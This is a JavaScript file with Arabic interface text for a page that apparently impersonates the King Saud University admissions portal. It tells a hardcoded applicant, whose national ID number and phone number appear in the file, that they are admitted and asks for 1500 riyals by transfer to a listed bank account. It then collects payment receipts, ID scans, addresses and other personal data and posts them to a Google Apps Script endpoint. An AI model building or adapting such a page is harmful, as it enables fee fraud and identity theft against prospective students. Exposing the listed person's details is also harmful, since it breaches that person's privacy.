// =================== بيانات الطلاب ===================
const studentData = {
    "1145181531": {
        name: "أحمد منير توفيق الأيوبي",
        degree: "بكالوريوس",
        major: "فيزياء",
        status: "مقبول",
        admissionDate: "2025/07/04",
        phone: "0566962545",
        fees: {
            tuition: 1500,
            registration: 0,
            books: 0,
            total: 1500
        }
    }
};

let currentStudent = null;

// =================== دوال مساعدة ===================
function hideAllForms() {
    document.getElementById("forms-section").classList.add("hidden");
    document.getElementById("results-section").classList.add("hidden");
    document.getElementById("inquiry-form").classList.add("hidden");
    document.getElementById("application-form-container")?.classList.add("hidden");
}

function scrollToElement(id) {
    document.getElementById(id).scrollIntoView({ behavior: "smooth", block: "start" });
}

// =================== الاستعلام عن القبول ===================
function showInquiryForm() {
    hideAllForms();
    document.getElementById("forms-section").classList.remove("hidden");
    document.getElementById("inquiry-form").classList.remove("hidden");
    document.getElementById("inquiry-id").value = "";
    document.getElementById("inquiry-phone").value = "";
    scrollToElement("forms-section");

    // أزرار التحكم
    document.getElementById("inquiry-card").querySelector(".submit-btn").onclick = showInquiryForm;
    document.getElementById("confirmation-card").querySelector(".submit-btn").onclick = () => alert("يرجى البدء بالاستعلام عن القبول أولاً");
    document.getElementById("payment-card").querySelector(".submit-btn").onclick = () => alert("يرجى البدء بالاستعلام عن القبول أولاً");
}

function checkAdmission() {
    const id = document.getElementById("inquiry-id").value;
    const phone = document.getElementById("inquiry-phone").value;

    if (!id || !phone) {
        alert("الرجاء إدخال رقم الهوية ورقم الجوال.");
        return;
    }

    if (studentData[id] && studentData[id].phone === phone) {
        currentStudent = studentData[id];
        showAdmissionResult();
    } else {
        alert("عذراً، لا توجد بيانات قبول مطابقة.");
    }
}

function showAdmissionResult() {
    hideAllForms();
    const resultsSection = document.getElementById("results-section");
    resultsSection.innerHTML = `
        <div class="result-card">
            <div class="result-header">
                <h3>تم قبولك بنجاح!</h3>
                <p class="status-accepted">مبروك! تم قبولك في جامعة الملك سعود</p>
            </div>
            <div class="student-info">
                <div class="info-item"><label>الاسم:</label><span>${currentStudent.name}</span></div>
                <div class="info-item"><label>الدرجة العلمية:</label><span>${currentStudent.degree}</span></div>
                <div class="info-item"><label>التخصص:</label><span>${currentStudent.major}</span></div>
                <div class="info-item"><label>حالة القبول:</label><span>${currentStudent.status}</span></div>
                <div class="info-item"><label>تاريخ القبول:</label><span>${currentStudent.admissionDate}</span></div>
            </div>
            <button class="submit-btn" onclick="showConfirmationSuccess()">تأكيد القبول</button>
        </div>
    `;
    resultsSection.classList.remove("hidden");
    scrollToElement("results-section");

    document.getElementById("inquiry-card").querySelector(".submit-btn").onclick = () => alert("لقد استعلمت بالفعل عن القبول.");
    document.getElementById("confirmation-card").querySelector(".submit-btn").onclick = showConfirmationSuccess;
    document.getElementById("payment-card").querySelector(".submit-btn").onclick = () => alert("يرجى تأكيد القبول أولاً");
}

// =================== تأكيد القبول ===================
function showConfirmationSuccess() {
    hideAllForms();
    const resultsSection = document.getElementById("results-section");
    resultsSection.innerHTML = `
        <div class="result-card">
            <div class="result-header">
                <h3>تم تأكيد قبولك بنجاح!</h3>
                <p class="status-accepted">مبروك! تم تأكيد قبولك في جامعة الملك سعود</p>
            </div>
            <div class="student-info">
                <div class="info-item"><label>الاسم:</label><span>${currentStudent.name}</span></div>
                <div class="info-item"><label>الدرجة العلمية:</label><span>${currentStudent.degree}</span></div>
                <div class="info-item"><label>التخصص:</label><span>${currentStudent.major}</span></div>
            </div>
            <button class="submit-btn" onclick="showPaymentInvoice()">السداد</button>
        </div>
    `;
    resultsSection.classList.remove("hidden");
    scrollToElement("results-section");

    document.getElementById("inquiry-card").querySelector(".submit-btn").onclick = () => alert("لقد استعلمت بالفعل عن القبول.");
    document.getElementById("confirmation-card").querySelector(".submit-btn").onclick = () => alert("لقد أكدت قبولك بالفعل.");
    document.getElementById("payment-card").querySelector(".submit-btn").onclick = showPaymentInvoice;
}

// =================== فاتورة السداد ===================
function showPaymentInvoice() {
    hideAllForms();
    const resultsSection = document.getElementById("results-section");
    resultsSection.innerHTML = `
        <div class="result-card">
            <div class="result-header">
                <h3>فاتورة السداد</h3>
                <p>الرجاء سداد الرسوم المستحقة لإتمام التسجيل</p>
            </div>
            <div class="student-info">
                <div class="info-item"><label>الطالب:</label><span>${currentStudent.name}</span></div>
                <div class="info-item"><label>التخصص:</label><span>${currentStudent.major}</span></div>
            </div>
            <div class="payment-invoice">
                <div class="invoice-header"><h4>تفاصيل الرسوم</h4></div>
                <div class="invoice-details">
                    <div class="invoice-item"><span>الرسوم الدراسية:</span><span>${currentStudent.fees.tuition} ريال</span></div>
                    <div class="invoice-item"><span>رسوم التسجيل:</span><span>${currentStudent.fees.registration} ريال</span></div>
                    <div class="invoice-item"><span>رسوم الكتب:</span><span>${currentStudent.fees.books} ريال</span></div>
                </div>
                <div class="invoice-total"><p>المجموع الكلي</p><p class="total-amount">${currentStudent.fees.total} ريال سعودي</p></div>
            </div>
            <div class="bank-info">
                <h5>معلومات التحويل البنكي</h5>
                <div class="bank-details">
                    <div class="bank-item"><span>اسم البنك:</span><span>راجحي</span></div>
                    <div class="bank-item"><span>رقم الحساب:</span><span>SA3380000984608016472540</span></div>
                </div>
                <div class="upload-section">
                    <h5>رفع إيصال السداد</h5>
                    <div class="upload-area" onclick="document.getElementById('receipt-upload').click()">
                        <input type="file" id="receipt-upload" accept=".pdf,.jpg,.png">
                        <div class="upload-icon">📄</div>
                        <p>اضغط هنا لرفع إيصال السداد</p>
                        <p style="font-size: 14px; color: #999;">الملفات المدعومة: PDF, JPG, PNG (حد أقصى 5 ميجابايت)</p>
                        <p id="file-name" style="font-size: 16px; color: #00563F; font-weight: bold; margin-top: 10px;"></p>
                    </div>
                    <div class="form-group"><label>رقم الحساب المحول منه</label><input type="text" id="from-account" required></div>
                    <div class="form-group"><label>تاريخ العملية</label><input type="date" id="transfer-date" required></div>
                    <div class="form-group"><label>اسم الشخص المحول</label><input type="text" id="transfer-name" required></div>
                    <button class="submit-btn mt-20" onclick="submitPayment()">إرسال إيصال السداد</button>
                </div>
            </div>
        </div>
    `;
    resultsSection.classList.remove("hidden");
    scrollToElement("results-section");
}

// =================== عرض اسم الملف المرفوع ===================
function displayFileName() {
    const fileInput = document.getElementById("receipt-upload");
    const fileNameDisplay = document.getElementById("file-name");
    if (fileInput.files.length > 0) {
        fileNameDisplay.textContent = `الملف المحدد: ${fileInput.files[0].name}`;
    } else {
        fileNameDisplay.textContent = "";
    }
}

// =================== إرسال إيصال السداد ===================
function submitPayment() {
    const fileInput = document.getElementById("receipt-upload");
    const fromAccount = document.getElementById("from-account").value;
    const transferDate = document.getElementById("transfer-date").value;
    const transferName = document.getElementById("transfer-name").value;

    if (!fileInput.files[0] || !fromAccount || !transferDate || !transferName) {
        alert("يرجى ملء جميع بيانات السداد ورفع الإيصال.");
        return;
    }

    const url = "https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec";
    const formData = new FormData();
    formData.append("receipt", fileInput.files[0]);
    formData.append("fromAccount", fromAccount);
    formData.append("transferDate", transferDate);
    formData.append("transferName", transferName);
    formData.append("studentName", currentStudent.name);
    formData.append("total", currentStudent.fees.total);

    fetch(url, { method: 'POST', body: formData })
        .then(response => response.text())
        .then(data => {
            alert("تم إرسال إيصال السداد بنجاح!");
            showPaymentInvoice(); // إعادة عرض الفاتورة بعد الإرسال
        })
        .catch(error => console.error("خطأ في الإرسال:", error));
}

// =================== نموذج تقديم طلب جديد ===================
function showApplicationForm() {
    hideAllForms();
    document.getElementById("forms-section").classList.remove("hidden");

    let formContainer = document.getElementById("application-form-container");
    if (!formContainer) {
        formContainer = document.createElement("div");
        formContainer.id = "application-form-container";
        formContainer.classList.add("form-container");
        document.getElementById("forms-section").appendChild(formContainer);
    }

    formContainer.innerHTML = `
        <h3>نموذج تقديم طلب جديد</h3>
        <form id="applicationForm" enctype="multipart/form-data">
            <!-- البيانات الشخصية -->
            <div class="form-group"><label>الاسم الكامل</label><input type="text" name="fullName" required></div>
            <div class="form-group"><label>رقم الهوية / الإقامة</label><input type="text" name="idNumber" required></div>
            <div class="form-group"><label>تاريخ الميلاد</label><input type="date" name="dob" required></div>
            <div class="form-group"><label>الجنس</label>
                <select name="gender" required>
                    <option value="">اختر</option>
                    <option>ذكر</option>
                    <option>أنثى</option>
                </select>
            </div>
            <div class="form-group"><label>الجنسية</label><input type="text" name="nationality" required></div>
            <div class="form-group"><label>الدولة</label><input type="text" name="country" required></div>
            <div class="form-group"><label>المدينة</label><input type="text" name="city" required></div>
            <div class="form-group"><label>العنوان الكامل</label><input type="text" name="address" required></div>

            <!-- بيانات التواصل -->
            <div class="form-group"><label>رقم الجوال</label><input type="text" name="phone" required></div>
            <div class="form-group"><label>البريد الإلكتروني</label><input type="email" name="email" required></div>
            <div class="form-group"><label>رقم جوال ولي الأمر (اختياري)</label><input type="text" name="parentPhone"></div>

            <!-- بيانات المؤهل الدراسي -->
            <div class="form-group"><label>نوع المؤهل</label><input type="text" name="degreeType" required></div>
            <div class="form-group"><label>سنة التخرج</label><input type="text" name="graduationYear" required></div>
            <div class="form-group"><label>المعدل</label><input type="text" name="gpa" required></div>
            <div class="form-group"><label>اسم المدرسة / الجامعة</label><input type="text" name="schoolName" required></div>
            <div class="form-group"><label>تخصص المؤهل السابق (إن وجد)</label><input type="text" name="prevMajor"></div>
            <div class="form-group"><label>سبب اختيار البرنامج</label><input type="text" name="reason" required></div>

            <!-- المرفقات -->
            <div class="form-group"><label>صورة الهوية</label><input type="file" name="idFile" accept=".jpg,.jpeg,.png,.pdf" required></div>
            <div class="form-group"><label>صورة الشهادة</label><input type="file" name="certificateFile" accept=".jpg,.jpeg,.png,.pdf" required></div>
            <div class="form-group"><label>صورة شخصية (اختياري)</label><input type="file" name="photoFile" accept=".jpg,.jpeg,.png"></div>

            <!-- بيانات البرنامج المطلوب -->
            <div class="form-group"><label>البرنامج المطلوب</label><input type="text" name="requestedProgram" required></div>
            <div class="form-group"><label>نوع الدراسة</label>
                <select name="studyType" required>
                    <option value="">اختر</option>
                    <option>انتظام</option>
                    <option>انتساب</option>
                    <option>مسائي</option>
                </select>
            </div>
            <div class="form-group"><label>الرغبة الأولى</label><input type="text" name="firstChoice" required></div>
            <div class="form-group"><label>الرغبة الثانية</label><input type="text" name="secondChoice"></div>

            <button type="submit" class="submit-btn">إرسال الطلب</button>
        </form>
        <div id="successMessage" class="hidden" style="margin-top:15px; padding:10px; background:#d4edda; color:#155724; border-radius:5px;">
            تم استلام جميع بياناتك بنجاح. سيتم التواصل معك لإعطائك الرقم الجامعي.
        </div>
    `;
    formContainer.classList.remove("hidden");
    scrollToElement("forms-section");

    const applicationForm = document.getElementById("applicationForm");
    applicationForm.addEventListener("submit", function(e) {
        e.preventDefault();
        document.getElementById("successMessage").classList.remove("hidden");

        // إرسال البيانات إلى Google Apps Script
        const url = "https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec";
        const formData = new FormData(applicationForm);
        fetch(url, { method: 'POST', body: formData })
            .then(response => response.text())
            .then(data => console.log("تم الإرسال بنجاح:", data))
            .catch(error => console.error("خطأ في الإرسال:", error));

        this.reset();
    });
}

// =================== تهيئة الصفحة ===================
document.addEventListener("DOMContentLoaded", () => {
    hideAllForms();
});
